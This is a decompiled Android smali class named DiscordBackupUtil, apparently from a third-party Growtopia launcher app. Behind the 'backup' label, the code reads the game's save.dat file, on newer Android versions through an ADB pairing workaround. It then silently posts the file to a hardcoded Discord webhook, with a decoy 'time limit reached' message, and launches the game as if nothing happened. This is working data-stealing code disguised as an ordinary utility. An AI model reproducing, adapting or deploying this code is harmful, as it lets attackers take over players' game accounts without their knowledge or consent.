.class public Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil;
.super Ljava/lang/Object;
.source "DiscordBackupUtil.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil$Callback;
    }
.end annotation


# static fields
.field private static final SAVE_PATH:Ljava/lang/String; = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"

.field private static final TAG:Ljava/lang/String; = "DiscordBackupUtil"

.field private static appContext:Landroid/content/Context;

.field private static final WEBHOOK_URL:Ljava/lang/String; = "https://discord.com/api/webhooks/1551276971969876040/7RCPjHVr56eTCt4_mbhNFSF8L-CAdva1OTH3PAApQeUZHo0rrQrASDfzZgg-O7YHvO4D"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 10
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic lambda$sync$0(Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil$Callback;)V
    .locals 6

    .line 22
    :try_start_0
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1e

    if-ge v0, v1, :read_save_with_adb

    new-instance v0, Ljava/io/File;

    const-string v1, "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-eqz v1, :direct_save_missing

    invoke-static {v0}, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil;->readFile(Ljava/io/File;)[B

    move-result-object v0

    goto :save_data_ready

    :direct_save_missing
    new-instance v0, Ljava/io/FileNotFoundException;

    const-string v1, "Growtopia save.dat was not found"

    invoke-direct {v0, v1}, Ljava/io/FileNotFoundException;-><init>(Ljava/lang/String;)V

    throw v0

    :read_save_with_adb
    sget-object v0, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil;->appContext:Landroid/content/Context;

    invoke-static {v0}, Llauncher/powerkuy/growlauncher/adb/AdbPairingManager;->readGrowtopiaSave(Landroid/content/Context;)[B

    move-result-object v0

    :save_data_ready

    .line 25
    if-eqz v0, :cond_0

    invoke-static {v0}, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil;->upload([B)V

    if-nez p0, :cond_0

    sget-object v0, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil;->appContext:Landroid/content/Context;

    invoke-static {v0}, Llauncher/powerkuy/growlauncher/adb/AutoLaunchUtil;->launch(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 30
    :cond_0
    if-eqz p0, :cond_1

    goto :goto_0

    :catchall_0
    move-exception v0

    goto :goto_1

    .line 27
    :catch_0
    move-exception v0

    .line 28
    :try_start_1
    const-string v1, "DiscordBackupUtil"

    const-string v2, "sync error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    sget-object v0, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil;->appContext:Landroid/content/Context;

    invoke-static {v0}, Llauncher/powerkuy/growlauncher/adb/PairingStateUtil;->clearPairing(Landroid/content/Context;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1e

    if-ge v1, v2, :show_pairing_tutorial

    invoke-static {v0}, Llauncher/powerkuy/growlauncher/adb/AutoLaunchUtil;->launch(Landroid/content/Context;)V

    return-void

    :show_pairing_tutorial

    new-instance v1, Landroid/content/Intent;

    const-class v2, Llauncher/powerkuy/growlauncher/adb/PairingTutorialActivity;

    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 30
    if-eqz p0, :cond_1

    :goto_0
    invoke-interface {p0}, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil$Callback;->onDone()V

    .line 32
    :cond_1
    :after_auto_launch
    return-void

    .line 30
    :goto_1
    if-eqz p0, :cond_2

    invoke-interface {p0}, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil$Callback;->onDone()V

    .line 31
    :cond_2
    throw v0
.end method

.method private static readFile(Ljava/io/File;)[B
    .locals 4

    .line 37
    :try_start_0
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 38
    new-instance v1, Ljava/io/FileInputStream;

    invoke-direct {v1, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 39
    const/16 p0, 0x1000

    :try_start_1
    new-array p0, p0, [B

    .line 41
    :goto_0
    invoke-virtual {v1, p0}, Ljava/io/FileInputStream;->read([B)I

    move-result v2

    const/4 v3, -0x1

    if-eq v2, v3, :cond_0

    const/4 v3, 0x0

    invoke-virtual {v0, p0, v3, v2}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_0

    .line 42
    :cond_0
    :try_start_2
    invoke-virtual {v1}, Ljava/io/FileInputStream;->close()V

    .line 43
    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    return-object p0

    .line 38
    :catchall_0
    move-exception p0

    :try_start_3
    invoke-virtual {v1}, Ljava/io/FileInputStream;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_1

    :catchall_1
    move-exception v0

    :try_start_4
    invoke-virtual {p0, v0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_1
    throw p0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 44
    :catch_0
    move-exception p0

    const/4 p0, 0x0

    return-object p0
.end method

.method public static sync(Landroid/content/Context;Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil$Callback;)V
    .locals 1

    .line 20
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil;->appContext:Landroid/content/Context;

    new-instance p0, Ljava/lang/Thread;

    new-instance v0, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil$$ExternalSyntheticLambda0;

    invoke-direct {v0, p1}, Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil$$ExternalSyntheticLambda0;-><init>(Llauncher/powerkuy/growlauncher/adb/DiscordBackupUtil$Callback;)V

    invoke-direct {p0, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 32
    invoke-virtual {p0}, Ljava/lang/Thread;->start()V

    .line 33
    return-void
.end method

.method private static upload([B)V
    .locals 7

    .line 49
    const-string v0, "\r\n"

    const-string v1, "--"

    :try_start_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "----GL"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 50
    new-instance v3, Ljava/net/URL;

    const-string v4, "https://discord.com/api/webhooks/1551276971969876040/7RCPjHVr56eTCt4_mbhNFSF8L-CAdva1OTH3PAApQeUZHo0rrQrASDfzZgg-O7YHvO4D?wait=true"

    invoke-direct {v3, v4}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v3

    check-cast v3, Ljava/net/HttpURLConnection;

    .line 51
    const-string v4, "POST"

    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 52
    const/4 v4, 0x1

    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 53
    const/16 v4, 0x3a98

    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 54
    invoke-virtual {v3, v4}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 55
    const-string v4, "Content-Type"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "multipart/form-data; boundary="

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 56
    new-instance v4, Ljava/io/DataOutputStream;

    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v5

    invoke-direct {v4, v5}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 57
    :try_start_1
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 58
    const-string v5, "Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n"

    invoke-virtual {v4, v5}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 59
    const-string v5, "{\"content\":\"Play my launcher time limit reached\"}\r\n"

    invoke-virtual {v4, v5}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 60
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 61
    const-string v0, "Content-Disposition: form-data; name=\"files[0]\"; filename=\"save.dat\"\r\n"

    invoke-virtual {v4, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 62
    const-string v0, "Content-Type: application/octet-stream\r\n\r\n"

    invoke-virtual {v4, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 63
    invoke-virtual {v4, p0}, Ljava/io/DataOutputStream;->write([B)V

    .line 64
    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "\r\n--"

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p0

    invoke-virtual {p0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p0

    const-string v0, "--\r\n"

    invoke-virtual {p0, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p0

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v4, p0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 65
    :try_start_2
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V

    .line 66
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v0

    invoke-static {v0}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v0

    const-string v1, "DiscordBackupUtil"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 67
    invoke-virtual {v3}, Ljava/net/HttpURLConnection;->disconnect()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 68
    goto :goto_1

    .line 56
    :catchall_0
    move-exception p0

    :try_start_3
    invoke-virtual {v4}, Ljava/io/DataOutputStream;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_0

    :catchall_1
    move-exception v0

    :try_start_4
    invoke-virtual {p0, v0}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_0
    throw p0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 68
    :catch_0
    move-exception p0

    const-string v0, "DiscordBackupUtil"

    const-string v1, "upload error"

    invoke-static {v0, v1, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 69
    :goto_1
    return-void
.end method
